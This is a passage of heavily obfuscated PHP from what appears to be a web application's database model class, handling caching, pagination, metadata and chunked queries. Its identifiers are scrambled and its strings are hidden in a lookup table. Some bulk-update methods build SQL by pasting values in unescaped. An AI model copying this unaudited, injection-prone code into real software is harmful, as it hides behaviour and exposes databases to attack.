$this->cache(null, 0); } protected function cacheCallCheck($©»¨‹¿È, $÷¤÷ÃÚ½, $½¶±‘Æ´ = false) { $°—  ¬Í =& $_SERVER[´‹ô¯Œ]; $äó§Ú¥  = $this->cacheFunctionAlias($÷¤÷ÃÚ½); if (!$äó§Ú¥ ) { return; } foreach ($äó§Ú¥  as $¾ÀóÙß => $×ß‘¢›…) { $Œ¹ğğ¶ = $×ß‘¢›…[0]; $¸ø‹Åöé = explode($°—  ¬Í[50], $×ß‘¢›…[1]); $ÙùÅ€”â = isset($×ß‘¢›…[2]) ? $×ß‘¢›…[2] : $°—  ¬Í[12]; if ($©»¨‹¿È == $¾ÀóÙß) { return $this->cacheFunctionGet($¾ÀóÙß, $Œ¹ğğ¶, $ÙùÅ€”â); } if ($½¶±‘Æ´ && in_array($©»¨‹¿È, $¸ø‹Åöé)) { $this->cacheFunctionClear($¾ÀóÙß, $Œ¹ğğ¶, $ÙùÅ€”â); } } } public function cacheFunctionGet($˜«¡Ù’, $Óæ†ä¯±, $å¥Áâòş = '') { $Úòâ²éë = $this->cacheKeyMake($˜«¡Ù’, $Óæ†ä¯±, $å¥Áâòş); $ø¨á®Ş— = Cache::get($Úòâ²éë); if (!is_array($ø¨á®Ş—)) { $ø¨á®Ş— = call_user_func_array(array($this, $˜«¡Ù’), array($Óæ†ä¯±, !0)); Cache::set($Úòâ²éë, $ø¨á®Ş—); } return $ø¨á®Ş—; } public function cacheFunctionClear($û”òùü–, $â¾®¡¤, $íÓï³ÌÀ = '') { $†É¸ìı¶ = $â¾®¡¤; if (!is_array($â¾®¡¤)) { $†É¸ìı¶ = array($â¾®¡¤); } foreach ($†É¸ìı¶ as $Ü»¸İÒ) { $æ©Ûâ = $this->cacheKeyMake($û”òùü–, $Ü»¸İÒ, $íÓï³ÌÀ); Cache::remove($æ©Ûâ); } } public function cacheKeyMake($íÌÊ°ô©, $¸¾„Æ¡¢, $Ç›Ü¦èğ) { $ÜúÁûê„ =& $_SERVER[´‹ô¯Œ]; if ($Ç›Ü¦èğ) { $¸¾„Æ¡¢ = $¸¾„Æ¡¢ . $ÜúÁûê„[439] . $Ç›Ü¦èğ; } return get_class($this) . $ÜúÁûê„[11] . $íÌÊ°ô© . $ÜúÁûê„[440] . $¸¾„Æ¡¢; } protected function selectPageReset() { $³²•ü‹¦ =& $_SERVER[´‹ô¯Œ]; if (isset($GLOBALS[$³²•ü‹¦[441]])) { return; } $GLOBALS[$³²•ü‹¦[441]] = isset($GLOBALS[$³²•ü‹¦[7]][$³²•ü‹¦[442]]) ? $GLOBALS[$³²•ü‹¦[7]][$³²•ü‹¦[442]] : !1; $GLOBALS[$³²•ü‹¦[443]] = isset($GLOBALS[$³²•ü‹¦[7]][$³²•ü‹¦[431]]) ? $GLOBALS[$³²•ü‹¦[7]][$³²•ü‹¦[431]] : !1; $GLOBALS[$³²•ü‹¦[7]][$³²•ü‹¦[442]] = !1; $GLOBALS[$³²•ü‹¦[7]][$³²•ü‹¦[431]] = !1; } protected function selectPageRestore() { $³À®ˆ¡ =& $_SERVER[´‹ô¯Œ]; if (!isset($GLOBALS[$³À®ˆ¡[441]])) { return; } $GLOBALS[$³À®ˆ¡[7]][$³À®ˆ¡[442]] = $GLOBALS[$³À®ˆ¡[441]]; $GLOBALS[$³À®ˆ¡[7]][$³À®ˆ¡[431]] = $GLOBALS[$³À®ˆ¡[443]]; if ($GLOBALS[$³À®ˆ¡[7]][$³À®ˆ¡[442]] === !1) { unset($GLOBALS[$³À®ˆ¡[7]][$³À®ˆ¡[442]]); } if ($GLOBALS[$³À®ˆ¡[7]][$³À®ˆ¡[431]] === !1) { unset($GLOBALS[$³À®ˆ¡[7]][$³À®ˆ¡[431]]); } unset($GLOBALS[$³À®ˆ¡[441]]); unset($GLOBALS[$³À®ˆ¡[443]]); } protected function selectPage($“Šª¾Ü½ = 200, $ÈÍš¸ = 1) { $ÄÍÔüæ† =& $_SERVER[´‹ô¯Œ]; global $in; $²Å¯ˆ£ö = $this->optionsValue(); $ ğóñ = 50000; $“Šª¾Ü½ = isset($in[$ÄÍÔüæ†[442]]) && $in[$ÄÍÔüæ†[442]] ? $in[$ÄÍÔüæ†[442]] : $“Šª¾Ü½; if ($“Šª¾Ü½ === -1) { $in[$ÄÍÔüæ†[442]] = !1; $ ğóñ = 100000000; $“Šª¾Ü½ = $ ğóñ; } $ƒ¿Â€™Ê = $²Å¯ˆ£ö; $ƒ¿Â€™Ê[$ÄÍÔüæ†[444]] = array(); $“Šª¾Ü½ = intval($“Šª¾Ü½); $“Šª¾Ü½ = $“Šª¾Ü½ <= 5 ? 5 : ($“Šª¾Ü½ >= $ ğóñ ? $ ğóñ : $“Šª¾Ü½); $ÈÍš¸ = intval(isset($in[$ÄÍÔüæ†[431]]) && $in[$ÄÍÔüæ†[431]] ? $in[$ÄÍÔüæ†[431]] : $ÈÍš¸); $ÈÍš¸ = $ÈÍš¸ <= 1 ? 1 : $ÈÍš¸; $“Úö™Ñ = array(); $¦ñä¶Šå = 1; if ($ÈÍš¸ == 1 && $¦ñä¶Šå) { $this->optionsValue($²Å¯ˆ£ö); $“Úö™Ñ = $this->page($ÈÍš¸, $“Šª¾Ü½)->select(); $œÈß†âÛ = is_array($“Úö™Ñ) ? count($“Úö™Ñ) : 0; if ($œÈß†âÛ < $“Šª¾Ü½) { $¡°Ó–Âä = 1; } else { $this->optionsValue($ƒ¿Â€™Ê); $œÈß†âÛ = intval($this->count()); $¡°Ó–Âä = ceil($œÈß†âÛ / $“Šª¾Ü½); } } else { $this->optionsValue($ƒ¿Â€™Ê); $œÈß†âÛ = intval($this->count()); $¡°Ó–Âä = ceil($œÈß†âÛ / $“Šª¾Ü½); $ÈÍš¸ = $ÈÍš¸ >= $¡°Ó–Âä ? $¡°Ó–Âä : $ÈÍš¸; $this->optionsValue($²Å¯ˆ£ö); $“Úö™Ñ = $this->page($ÈÍš¸, $“Šª¾Ü½)->select(); } if (!is_array($“Úö™Ñ)) { $“Úö™Ñ = array(); } if ($¡°Ó–Âä == 1) { $œÈß†âÛ = count($“Úö™Ñ); } $¡ıÆı” = array($ÄÍÔüæ†[445] => array($ÄÍÔüæ†[446] => $œÈß†âÛ, $ÄÍÔüæ†[442] => $“Šª¾Ü½, $ÄÍÔüæ†[431] => $ÈÍš¸, $ÄÍÔüæ†[447] => $¡°Ó–Âä), $ÄÍÔüæ†[448] => $“Úö™Ñ); return $¡ıÆı”; } protected function checkLength($€¿Õ‹“ş, $ºŞá€¸Ó = 0, $ó¸”¡¾û = '') { $ÈÈ§şÄÎ =& $_SERVER[´‹ô¯Œ]; $ºŞá€¸Ó = $ºŞá€¸Ó ? $ºŞá€¸Ó : 65536; if (!$€¿Õ‹“ş || strlen($€¿Õ‹“ş) < $ºŞá€¸Ó) { return; } $ó¸”¡¾û = $ó¸”¡¾û ? $ó¸”¡¾û . $ÈÈ§şÄÎ[74] : $ÈÈ§şÄÎ[12]; show_json($ó¸”¡¾û . LNG($ÈÈ§şÄÎ[449]) . "\50{$ºŞá€¸Ó}\x29", !1); } protected function metaSet($ı´¿¶¼, $¤²Ä…© = null, $°×ØÌúî = null) { $àµÌÏìµ =& $_SERVER[´‹ô¯Œ]; if (!$this->tableMeta || !$ı´¿¶¼) { return !1; } $æÊ¬óÑú = $this->tableMeta[$àµÌÏìµ[450]]; $ Ş¹²Ò = $this->tableMeta[$àµÌÏìµ[451]]; $ØĞ¯­œ· = Model($ Ş¹²Ò); $•×ÑÄŠ = array($æÊ¬óÑú => $ı´¿¶¼, $àµÌÏìµ[452] => $¤²Ä…©); if (is_null($¤²Ä…©)) { return $ØĞ¯­œ·->where(array($æÊ¬óÑú => $ı´¿¶¼))->delete(); } if (is_null($°×ØÌúî) && is_string($¤²Ä…©)) { return $ØĞ¯­œ·->where($•×ÑÄŠ)->delete(); } $ïş÷˜‹ğ = is_array($¤²Ä…©) ? $¤²Ä…© : array(); if (is_string($¤²Ä…©)) { $ïş÷˜‹ğ[$¤²Ä…©] = $°×ØÌúî; } $‘»ğ³— = array(); foreach ($ïş÷˜‹ğ as $¸Û¤¹Ø => $ÎÂ°ø ”) { if (is_null($ÎÂ°ø ”) && is_string($¸Û¤¹Ø)) { $ØĞ¯­œ·->where(array($æÊ¬óÑú => $ı´¿¶¼, $àµÌÏìµ[452] => $¸Û¤¹Ø))->delete(); continue; } $this->checkLength($ÎÂ°ø ”, !1, $ Ş¹²Ò . $àµÌÏìµ[4] . $¸Û¤¹Ø); $‘»ğ³—[] = array($æÊ¬óÑú => $ı´¿¶¼, $àµÌÏìµ[97] => $¸Û¤¹Ø, $àµÌÏìµ[453] => $ÎÂ°ø ”); } $–‚©†Ğ´ = $àµÌÏìµ[454] . $ Ş¹²Ò; CacheLock::lock($–‚©†Ğ´); $ØĞ¯­œ·->where(array($æÊ¬óÑú => $ı´¿¶¼))->addAll($‘»ğ³—, array(), !0); CacheLock::unlock($–‚©†Ğ´); return !0; } public function metaGet($» ÔÇ¡´, $ãˆ¤ãÊè = false) { $­º¥øÌ÷ =& $_SERVER[´‹ô¯Œ]; if (!$this->tableMeta) { return array(); } $÷°­¯É° = $this->tableMeta[$­º¥øÌ÷[450]]; $ê»—·öÛ = Model($this->tableMeta[$­º¥øÌ÷[451]]); if ($ãˆ¤ãÊè) { $€¥ğŞü† = array($÷°­¯É° => $» ÔÇ¡´, $­º¥øÌ÷[97] => $ãˆ¤ãÊè); return $ê»—·öÛ->where($€¥ğŞü†)->getField($­º¥øÌ÷[453]); } $€¥ğŞü† = array($÷°­¯É° => $» ÔÇ¡´); $ Ù¬…³à = $ê»—·öÛ->field($­º¥øÌ÷[455])->where($€¥ğŞü†)->select(); $ Ù¬…³à = array_to_keyvalue($ Ù¬…³à, $­º¥øÌ÷[97], $­º¥øÌ÷[453]); return $ Ù¬…³à; } private function checkDataAutoHas($Û„²şÍÀ) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $ıŸÜ—±) { if (in_array($Û„²şÍÀ, explode($_SERVER[´‹ô¯Œ][50], $ıŸÜ—±[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$ÃØ‘££û, $ÚÊ÷²÷) { $Û®ƒÑ =& $_SERVER[´‹ô¯Œ]; if (!is_array($ÃØ‘££û)) { return; } foreach ($this->dataAuto as $à³ŸÖãÒ) { $ÏÃ‹ƒ§ = $à³ŸÖãÒ[0]; if (!in_array($ÚÊ÷²÷, explode($Û®ƒÑ[50], $à³ŸÖãÒ[2]))) { continue; } switch (trim($à³ŸÖãÒ[3])) { case $Û®ƒÑ[399]: case $Û®ƒÑ[400]: $Şœ¡ùŸÖ = $à³ŸÖãÒ[1]; $µÈ¹ş¥ë = isset($à³ŸÖãÒ[4]) ? (array) $à³ŸÖãÒ[4] : array(); if ($Şœ¡ùŸÖ == $Û®ƒÑ[207] && array_key_exists($ÏÃ‹ƒ§, $ÃØ‘££û)) { if (!$ÃØ‘££û[$ÏÃ‹ƒ§]) { unset($ÃØ‘££û[$ÏÃ‹ƒ§]); } break; } if (isset($ÃØ‘££û[$ÏÃ‹ƒ§])) { array_unshift($µÈ¹ş¥ë, $ÃØ‘££û[$ÏÃ‹ƒ§]); } if ($Û®ƒÑ[399] == $à³ŸÖãÒ[3]) { $ÃØ‘££û[$ÏÃ‹ƒ§] = call_user_func_array($Şœ¡ùŸÖ, $µÈ¹ş¥ë); } else { $ÃØ‘££û[$ÏÃ‹ƒ§] = call_user_func_array(array(&$this, $Şœ¡ùŸÖ), $µÈ¹ş¥ë); } break; case $Û®ƒÑ[350]: if (isset($ÃØ‘££û[$ÏÃ‹ƒ§]) && $ÃØ‘££û[$ÏÃ‹ƒ§]) { $ÃØ‘££û[$ÏÃ‹ƒ§] = call_user_func_array(array(&$this, $à³ŸÖãÒ[1]), array($ÃØ‘££û[$ÏÃ‹ƒ§])); } break; case $Û®ƒÑ[353]: $ÃØ‘££û[$ÏÃ‹ƒ§] = $ÃØ‘££û[$à³ŸÖãÒ[1]]; break; case $Û®ƒÑ[372]: if (isset($ÃØ‘££û[$ÏÃ‹ƒ§]) && !is_string($ÃØ‘££û[$ÏÃ‹ƒ§])) { $ÃØ‘££û[$ÏÃ‹ƒ§] = json_encode_force($ÃØ‘££û[$ÏÃ‹ƒ§]); } break; case $Û®ƒÑ[401]: if ($ÃØ‘££û[$ÏÃ‹ƒ§] === $Û®ƒÑ[12]) { unset($ÃØ‘££û[$ÏÃ‹ƒ§]); } break; case $Û®ƒÑ[402]: $ÃØ‘££û[$ÏÃ‹ƒ§] = $à³ŸÖãÒ[1]; default: break; } } if ($ÚÊ÷²÷ == $Û®ƒÑ[433]) { $º©ß¦šò = strtolower($this->db->getDbType()); if (strpos($º©ß¦šò, $Û®ƒÑ[13]) !== 0) { return; } $¥¢á‚Ï´ = $this->field(!0)->fields; $Ü„§€Œ— = $¥¢á‚Ï´[$Û®ƒÑ[332]]; if (isset($¥¢á‚Ï´[$Û®ƒÑ[331]])) { unset($Ü„§€Œ—[$¥¢á‚Ï´[$Û®ƒÑ[331]]]); } foreach ($Ü„§€Œ— as $Úì¾ØïÙ => $ÚÊ÷²÷) { if (!isset($ÃØ‘££û[$Úì¾ØïÙ])) { $ÃØ‘££û[$Úì¾ØïÙ] = $Û®ƒÑ[12]; } } } } private function dataAfterFilter(&$´ÚÍ±·Ç) { $Ö«ŒĞÅ› =& $_SERVER[´‹ô¯Œ]; foreach ($this->dataAuto as $³¥ƒ¾¤) { $õ©­ŸÏ = $³¥ƒ¾¤[0]; if (!isset($´ÚÍ±·Ç[$õ©­ŸÏ])) { continue; } if (!in_array($Ö«ŒĞÅ›[435], explode($Ö«ŒĞÅ›[50], $³¥ƒ¾¤[2]))) { continue; } switch (trim($³¥ƒ¾¤[3])) { case $Ö«ŒĞÅ›[399]: case $Ö«ŒĞÅ›[400]: $Õ¼¡éî = isset($³¥ƒ¾¤[4]) ? (array) $³¥ƒ¾¤[4] : array(); array_unshift($Õ¼¡éî, $´ÚÍ±·Ç[$õ©­ŸÏ]); if (isset($³¥ƒ¾¤[4]) && $³¥ƒ¾¤[4] == $Ö«ŒĞÅ›[456]) { $Õ¼¡éî = array($´ÚÍ±·Ç[$õ©­ŸÏ]); } if ($Ö«ŒĞÅ›[399] == $³¥ƒ¾¤[3]) { $´ÚÍ±·Ç[$õ©­ŸÏ] = call_user_func_array($³¥ƒ¾¤[1], $Õ¼¡éî); } else { $´ÚÍ±·Ç[$õ©­ŸÏ] = call_user_func_array(array(&$this, $³¥ƒ¾¤[1]), $Õ¼¡éî); } break; case $Ö«ŒĞÅ›[350]: if (isset($´ÚÍ±·Ç[$õ©­ŸÏ]) && $´ÚÍ±·Ç[$õ©­ŸÏ]) { $´ÚÍ±·Ç[$õ©­ŸÏ] = call_user_func_array(array(&$this, $³¥ƒ¾¤[1]), array($´ÚÍ±·Ç[$õ©­ŸÏ])); } break; case $Ö«ŒĞÅ›[353]: $´ÚÍ±·Ç[$õ©­ŸÏ] = $´ÚÍ±·Ç[$³¥ƒ¾¤[1]]; break; case $Ö«ŒĞÅ›[372]: $íâ“– = $´ÚÍ±·Ç[$õ©­ŸÏ]; $´ÚÍ±·Ç[$õ©­ŸÏ] = json_decode($íâ“–, !0); if (is_null($´ÚÍ±·Ç[$õ©­ŸÏ])) { $´ÚÍ±·Ç[$õ©­ŸÏ] = $íâ“–; } break; case $Ö«ŒĞÅ›[401]: if ($´ÚÍ±·Ç[$õ©­ŸÏ] === $Ö«ŒĞÅ›[12]) { unset($´ÚÍ±·Ç[$õ©­ŸÏ]); } break; case $Ö«ŒĞÅ›[402]: $´ÚÍ±·Ç[$õ©­ŸÏ] = $³¥ƒ¾¤[1]; break; default: break; } } } public function saveAll($¸è¿ªş÷) { $õ‡Û¬µğ =& $_SERVER[´‹ô¯Œ]; $®å™¼³¾ = $this->tablePrefix . $this->tableName; $˜¬¶¹Óä = self::SQL_WHERE_IN_CHUNK; $¸è¿ªş÷ = is_array($¸è¿ªş÷) ? $¸è¿ªş÷ : array(); $¡Ó‘—¯œ = $õ‡Û¬µğ[457]; $´Ë›è…¥ = 0; $üÑ·ôœŒ = array(); $ÆíÆ¤Œë = count($¸è¿ªş÷); for ($üå—¯û‰ = 0; $üå—¯û‰ < $ÆíÆ¤Œë; $üå—¯û‰++) { $ï±õ³“» = $¸è¿ªş÷[$üå—¯û‰]; if (!is_array($ï±õ³“») || count($ï±õ³“») != 4) { continue; } $ä›Ó››Î = "\x55\120\104\101\124\x45\40\x60{$®å™¼³¾}\140\x20\x53\x45\x54\40{$ï±õ³“»[2]}\x20\x3d\x20\103\101\123\105\40{$ï±õ³“»[0]}\40\12"; if ($´Ë›è…¥ == 0) { $¡Ó‘—¯œ = $ä›Ó››Î; } $üÑ·ôœŒ[] = $õ‡Û¬µğ[121] . $ï±õ³“»[1] . $õ‡Û¬µğ[121]; $´Ë›è…¥++; $¡Ó‘—¯œ .= "\x20\127\110\105\x4e\x20\47{$ï±õ³“»[1]}\x27\40\124\x48\x45\x4e\40\47{$ï±õ³“»[3]}\x27\x20\xa"; if ($´Ë›è…¥ == $˜¬¶¹Óä || $üå—¯û‰ == $ÆíÆ¤Œë - 1) { $ÆÇÊ³ª = implode($õ‡Û¬µğ[50], $üÑ·ôœŒ); $¡Ó‘—¯œ .= "\x20\x45\x4e\104\40\40\x57\x48\x45\122\105\x20{$ï±õ³“»[0]}\x20\111\x4e\x20\50{$ÆÇÊ³ª}\x29\x20"; $this->execute($¡Ó‘—¯œ); $´Ë›è…¥ = 0; $¡Ó‘—¯œ = $ä›Ó››Î; $this->chunkEventCheck(count($üÑ·ôœŒ)); $üÑ·ôœŒ = array(); } } $this->chunkEventSet(); } public function saveAllEach($¡Ó’…Õ™) { $ğ¤¢¾êª =& $_SERVER[´‹ô¯Œ]; $Ş°€‚ú = $this->tablePrefix . $this->tableName; foreach ($¡Ó’…Õ™ as $‰Š¶ïĞí) { if (!is_array($‰Š¶ïĞí) || count($‰Š¶ïĞí) != 4) { continue; } $Ã¤â”± = $‰Š¶ïĞí[0] . $ğ¤¢¾êª[458] . $‰Š¶ïĞí[1] . $ğ¤¢¾êª[121]; $ûß§Ö‹° = $‰Š¶ïĞí[2] . $ğ¤¢¾êª[458] . $‰Š¶ïĞí[3] . $ğ¤¢¾êª[121]; $Ÿ»£Èüà = "\165\160\x64\141\x74\x65\40{$Ş°€‚ú}\x20\163\145\164\x20{$ûß§Ö‹°}\40\167\150\145\162\145\x20{$Ã¤â”±}\x3b"; $this->execute($Ÿ»£Èüà); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($îõ­Ì½£ = false, $®¸›³†Ø = false) { $this->_chunkEvent = $îõ­Ì½£; $this->_chunkEventParam = $®¸›³†Ø; } private function chunkEventCheck($ıêÄ¤Î±) { if (!$this->_chunkEvent) { return; } $”—ûã™Â = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $”—ûã™Â[$_SERVER[´‹ô¯Œ][459]] = $ıêÄ¤Î±; Hook::trigger($this->_chunkEvent, $”—ûã™Â); } public function addAll($ş­®Ô€, $ˆ»›£˜… = array(), $˜³¹ÖÕ· = false) { $’Š¿ªÉ§ =& $_SERVER[´‹ô¯Œ]; ignore_timeout(); $Õª±äº‡ = self::SQL_WHERE_IN_CHUNK; if (empty($ş­®Ô€)) { $this->error = think_lang($’Š¿ªÉ§[351]); return !1; } $ˆ»›£˜… = $this->_parseOptions($ˆ»›£˜…); foreach ($ş­®Ô€ as $¼¥á¦û => $èØÌÀ) { $ş­®Ô€[$¼¥á¦û] = $this->_facade($èØÌÀ); $this->_beforeInsert($ş­®Ô€[$¼¥á¦û], $ˆ»›£˜…); } if (method_exists($this->db, $’Š¿ªÉ§[352])) { for ($Ï…¨½õş = 0; $Ï…¨½õş < count($ş­®Ô€); $Ï…¨½õş += $Õª±äº‡) { $£öåş½¯ = array_slice($ş­®Ô€, $Ï…¨½õş, $Õª±äº‡); if (!is_array($£öåş½¯) || count($£öåş½¯) == 0) { break; } $ÆíÔ¶ = $this->db->insertAll($£öåş½¯, $ˆ»›£˜…, $˜³¹ÖÕ·); $this->chunkEventCheck(count($£öåş½¯)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($ş­®Ô€ as $¼¥á¦û => $èØÌÀ) { $ÆíÔ¶ = $this->db->insert($èØÌÀ, $ˆ»›£˜…, $˜³¹ÖÕ·); } $this->commit(); } if (!1 !== $ÆíÔ¶) { $€’©Èîò = $this->getLastInsID(); if ($€’©Èîò) { return $€’©Èîò; } } return $ÆíÔ¶; } public function save($ó”ÁÒ¨‘ = '', $©—°ã¨Š = array()) { $è©„Ç³Ğ =& $_SERVER[´‹ô¯Œ]; $œ¯¾šëì = self::SQL_WHERE_IN_CHUNK; $âã©Ì¶À = $this->optionsValue(); $ÅÑ€…Ü = $this->findWhereField($âã©Ì¶À); if (!$ÅÑ€…Ü) { return parent::save($ó”ÁÒ¨‘, $©—°ã¨Š); } $‹îĞÛ–’ = 0; $×Ú…üÀŠ = $âã©Ì¶À[$è©„Ç³Ğ[355]][$ÅÑ€…Ü][1]; $×Ú…üÀŠ = is_array($×Ú…üÀŠ) ? $×Ú…üÀŠ : array(); $­èâ‰Š£ = count($×Ú…üÀŠ); for ($æíóÛéÊ = 0; $æíóÛéÊ < $­èâ‰Š£; $æíóÛéÊ += $œ¯¾šëì) { $÷¸š†… = array_slice($×Ú…üÀŠ, $æíóÛéÊ, $œ¯¾šëì); if (!is_array($÷¸š†…) || count($÷¸š†…) == 0) { break; } $âã©Ì¶À[$è©„Ç³Ğ[355]][$ÅÑ€…Ü][1] = $÷¸š†…; $this->optionsValue($âã©Ì¶À); $‹îĞÛ–’ += parent::save($ó”ÁÒ¨‘, $©—°ã¨Š); $this->chunkEventCheck(count($÷¸š†…)); } $this->chunkEventSet(); return $‹îĞÛ–’; } public function add($À‡•€‚á = '', $üéá³¢ß = array(), $ë½Àı™Ò = false) { if ($this->addTaskStatus && is_array($À‡•€‚á)) { $this->addTaskData[] = $À‡•€‚á; return; } return parent::add($À‡•€‚á, $üéá³¢ß, $ë½Àı™Ò); } public function parseWhereLike($©¬æÍªâ, $—Ï×Š²« = '', $€çš”‰§ = false, &$ë‰«Õ¯ = false) { $”ÅÄßËĞ =& $_SERVER[´‹ô¯Œ]; $›Ù­Ô”ë = $GLOBALS[$”ÅÄßËĞ[6]][$”ÅÄßËĞ[460]]; if (!$›Ù­Ô”ë[$”ÅÄßËĞ[461]]) { return $©¬æÍªâ; } if (!is_array($©¬æÍªâ)) { return $©¬æÍªâ; } $š¬¤º–Ì = array(); $ü®ËÓáÎ = 0; foreach ($©¬æÍªâ as $šôÚã¥Ó => $äØÈı) { if (is_array($äØÈı) && count($äØÈı) == 2 && $äØÈı[0] == $”ÅÄßËĞ[462] && is_string($äØÈı[1]) && substr($äØÈı[1], 0, 1) == $”ÅÄßËĞ[463] && substr($äØÈı[1], strlen($äØÈı[1]) - 1, 1) == $”ÅÄßËĞ[463]) { $ë‰«Õ¯ = !0; $ê«ìó¾î = is_string($šôÚã¥Ó) ? $šôÚã¥Ó : $—Ï×Š²«; $®‚ğŞÜæ = substr($äØÈı[1], 1, strlen($äØÈı[1]) - 2); $®‚ğŞÜæ = $this->db->escapeString($®‚ğŞÜæ); if (!strpos($ê«ìó¾î, $”ÅÄßËĞ[10])) { $ê«ìó¾î = $”ÅÄßËĞ[464] . $ê«ìó¾î . $”ÅÄßËĞ[464]; } $³¸ŞÚúÒ = $”ÅÄßËĞ[223] . $®‚ğŞÜæ . $”ÅÄßËĞ[223]; $®‚ğŞÜæ = str_replace(array($”ÅÄßËĞ[10], $”ÅÄßËĞ[465], $”ÅÄßËĞ[11]), $”ÅÄßËĞ[466], $®‚ğŞÜæ); if ($›Ù­Ô”ë[$”ÅÄßËĞ[467]]) { $³¸ŞÚúÒ = $”ÅÄßËĞ[468] . $®‚ğŞÜæ . $”ÅÄßËĞ[469]; if ($›Ù­Ô”ë[$”ÅÄßËĞ[470]]) { $³¸ŞÚúÒ = $”ÅÄßËĞ[469] . $®‚ğŞÜæ . $”ÅÄßËĞ[468]; } } $š¬¤º–Ì[$ü®ËÓáÎ] = $”ÅÄßËĞ[471] . $ê«ìó¾î . $”ÅÄßËĞ[472] . $³¸ŞÚúÒ . $”ÅÄßËĞ[473]; $ü®ËÓáÎ++; continue; } if (is_array($äØÈı)) { $—Ï×Š²« = is_string($šôÚã¥Ó) ? $šôÚã¥Ó : $—Ï×Š²«; $äØÈı = $this->parseWhereLike($äØÈı, $—Ï×Š²«, !0, $ë‰«Õ¯); } if (is_numeric($šôÚã¥Ó)) { $š¬¤º–Ì[$ü®ËÓáÎ] = $äØÈı; $ü®ËÓáÎ++; } else { $š¬¤º–Ì[$šôÚã¥Ó] = $äØÈı; } } if ($ë‰«Õ¯ && !$€çš”‰§) { } return $š¬¤º–Ì; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($Õú ±é = array()) { $ıÛ¤”ª± =& $_SERVER[´‹ô¯Œ]; $íî’©éÀ = self::SQL_WHERE_IN_CHUNK; $ÉƒæàşÜ = $this->optionsValue(); $ê–¨£Ù“ = $this->findWhereField($ÉƒæàşÜ); if (!$ê–¨£Ù“ || isset($ÉƒæàşÜ[$ıÛ¤”ª±[370]]) || isset($ÉƒæàşÜ[$ıÛ¤”ª±[431]])) { return parent::select($Õú ±é); } $Êª—úÔÖ = $ÉƒæàşÜ[$ıÛ¤”ª±[355]][$ê–¨£Ù“][1]; $Êª—úÔÖ = is_array($Êª—úÔÖ) ? $Êª—úÔÖ : array(); $Öµ«èÉ = null; for ($—´€ı“ğ = 0; $—´€ı“ğ < count($Êª—úÔÖ); $—´€ı“ğ += $íî’©éÀ) { $ÕùìÌÊ = array_slice($Êª—úÔÖ, $—´€ı“ğ, $íî’©éÀ); if (!is_array($ÕùìÌÊ) || count($ÕùìÌÊ) == 0) { break; } $ÉƒæàşÜ[$ıÛ¤”ª±[355]][$ê–¨£Ù“][1] = $ÕùìÌÊ; $this->optionsValue($ÉƒæàşÜ); $äè¡­Œò = parent::select($Õú ±é); if (!$äè¡­Œò) { continue; } $Öµ«èÉ = is_array($Öµ«èÉ) ? $Öµ«èÉ : array(); $Öµ«èÉ = array_merge($Öµ«èÉ, $äè¡­Œò); } return $Öµ«èÉ; } public function delete($©ˆÊÜ»ç = array()) { $ã®İ±’â =& $_SERVER[´‹ô¯Œ]; $šÎ = self::SQL_WHERE_IN_CHUNK; $ß½ÅåıÑ = $this->optionsValue(); $¸³óÁã¡ = $this->findWhereField($ß½ÅåıÑ); if (!$¸³óÁã¡) { return parent::delete($©ˆÊÜ»ç); } $ÔÛĞ„î¦ = 0; $¦Ï´„ÄÊ = $ß½ÅåıÑ[$ã®İ±’â[355]][$¸³óÁã¡][1]; $¦Ï´„ÄÊ = is_array($¦Ï´„ÄÊ) ? $¦Ï´„ÄÊ : array(); for ($Ã’ä‘¡³ = 0; $Ã’ä‘¡³ < count($¦Ï´„ÄÊ); $Ã’ä‘¡³ += $šÎ) { $‡Ÿ¤‹åÙ = array_slice($¦Ï´„ÄÊ, $Ã’ä‘¡³, $šÎ); if (!is_array($‡Ÿ¤‹åÙ) || count($‡Ÿ¤‹åÙ) == 0) { break; } $ß½ÅåıÑ[$ã®İ±’â[355]][$¸³óÁã¡][1] = $‡Ÿ¤‹åÙ; $this->optionsValue($ß½ÅåıÑ); $ÔÛĞ„î¦ += parent::delete($©ˆÊÜ»ç); } return $ÔÛĞ„î¦; } private function findWhereField($­ãí¤¶Ğ) { $§¤ëìÄ» =& $_SERVER[´‹ô¯Œ]; $µÚ÷ºëá = self::SQL_WHERE_IN_CHUNK; if (!is_array($­ãí¤¶Ğ) || !is_array($­ãí¤¶Ğ[$§¤ëìÄ»[355]])) { return !1; } foreach ($­ãí¤¶Ğ[$§¤ëìÄ»[355]] as $ÉİÍÂÀ× => $É”ñò…) { if (is_array($É”ñò…) && isset($É”ñò…[0]) && is_string($É”ñò…[0]) && strtolower($É”ñò…[0]) == $§¤ëìÄ»[7] && is_array($É”ñò…[1]) && count($É”ñò…[1]) > $µÚ÷ºëá) { ignore_timeout(); return $ÉİÍÂÀ×; } } return !1; } public function setMasterDB($ ‹·èß = true) { think_config($_SERVER[´‹ô¯Œ][474], $ ‹·èß); } } goto eçãß½ºõ; Aùƒäøì­À: class Message { function __construct() { } public function send($©®ß¯ˆ = '', $ Éª˜ûá = array(), $ğ¹¬¯ÈÑ = "\164\145\170\x74") { $«ˆË°êø =& $_SERVER[´‹ô¯Œ]; $ŠßÇİ•é = array($«ˆË°êø[33] => $«ˆË°êø[1228], $«ˆË°êø[171] => $©®ß¯ˆ); if (in_array($ğ¹¬¯ÈÑ, array($«ˆË°êø[1228], $«ˆË°êø[1645]))) { $ŠßÇİ•é[$«ˆË°êø[33]] = $ğ¹¬¯ÈÑ; } $ Éª˜ûá = array($«ˆË°êø[592] => isset($ Éª˜ûá[$«ˆË°êø[592]]) ? $ Éª˜ûá[$«ˆË°êø[592]] : $«ˆË°êø[12], $«ˆË°êø[679] => isset($ Éª˜ûá[$«ˆË°êø[679]]) ? $ Éª˜ûá[$«ˆË°êø[679]] : $«ˆË°êø[12]); if (empty($©®ß¯ˆ) || empty($ Éª˜ûá[$«ˆË°êø[592]]) && empty($ Éª˜ûá[$«ˆË°êø[679]])) { return !1; } $Öôë¾‘ = array($«ˆË°êø[1574] => 